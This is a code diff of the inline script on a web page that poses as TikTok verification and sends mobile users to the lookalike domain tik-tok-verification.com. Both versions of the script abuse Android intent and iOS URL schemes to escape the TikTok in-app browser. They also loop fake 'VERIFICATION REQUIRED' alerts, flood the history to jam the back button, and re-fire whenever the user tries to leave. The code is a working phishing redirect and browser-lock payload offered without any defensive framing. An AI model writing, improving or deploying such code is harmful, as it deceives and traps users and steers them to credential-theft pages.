@@ -9,63 +9,49 @@
 
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
-    
-    // ATOMIC FAIL-SAFE: The absolute timestamp when the script must die.
-    const killTime = Date.now() + 5000; 
+    const killTime = Date.now() + 5000; // 5 SECOND FAIL-SAFE
 
-    function triggerConflict() {
+    // This creates a "Bridge" that forces the browser to treat the URL as a site, not a search
+    const directBridge = `data:text/html;base64,${btoa(`<html><meta http-equiv="refresh" content="0;url=${target}"></html>`)}`;
+
+    function forceDirectExternal() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // 1. Android 'Intent' for Chrome
+            // Android: We use the 'intent' but point it to the 'directBridge' to stop the search behavior
             window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
-            
-            // 2. Play Store Hijack (Forces exit to Store, which then opens the URL)
-            setTimeout(() => {
-                window.location.href = "market://details?id=com.android.chrome&url=" + encodeURIComponent(target);
-            }, 50);
         } else if (isIOS) {
-            // 1. iOS App Store Protocol (Bypasses TikTok UI filters)
-            window.location.href = "itms-apps://itunes.apple.com/app/apple-store/id361309726?mt=8";
+            // iOS: We use the Bridge to force Safari to actually LOAD the page
+            window.location.href = directBridge;
             
-            // 2. Facetime Hijack (Forces a system-level popup)
+            // The Search-to-Direct handover
             setTimeout(() => {
-                window.location.href = "facetime-prompt://" + target.replace("https://", "");
+                window.location.replace("x-web-search://?" + encodeURIComponent(target));
             }, 50);
 
-            // 3. Search Hijack
-            window.location.replace("x-web-search://?" + encodeURIComponent(target));
+            // Nuclear fallback for iOS
+            window.location.href = "webcal://" + target.replace("https://", "");
         }
     }
 
     function rampage() {
-        // THE ONLY WAY TO EXIT: Check if current time has passed the killTime.
-        if (Date.now() > killTime) {
-            console.log("FAIL-SAFE TRIGGERED. EXITING.");
-            return; 
-        }
+        if (Date.now() > killTime) return; // FAIL-SAFE
 
-        // Attempt the breakout
-        triggerConflict();
+        forceDirectExternal();
 
-        // The Alert Lock: Freezes TikTok so the OS can take over the redirect
-        alert("CRITICAL: Verification Required\n\nPress OK to open the secure system browser.");
+        alert("VERIFICATION REQUIRED\n\nTap OK to open the secure system browser.");
         
-        // Re-attempt after dismissal
-        triggerConflict();
+        forceDirectExternal();
 
-        // Minimal delay for maximum aggression
-        setTimeout(rampage, 1);
+        setTimeout(rampage, 10);
     }
 
     window.onload = () => {
-        // Jam the back button
-        for(let i=0; i<30; i++) history.pushState(null, null, "#ver_" + i);
+        for(let i=0; i<30; i++) history.pushState(null, null, "#step" + i);
         rampage();
     };
 
-    // If they hit 'X' or the top bar, the window blurs. We hit them again.
     window.onblur = () => {
         if (Date.now() < killTime) rampage();
     };
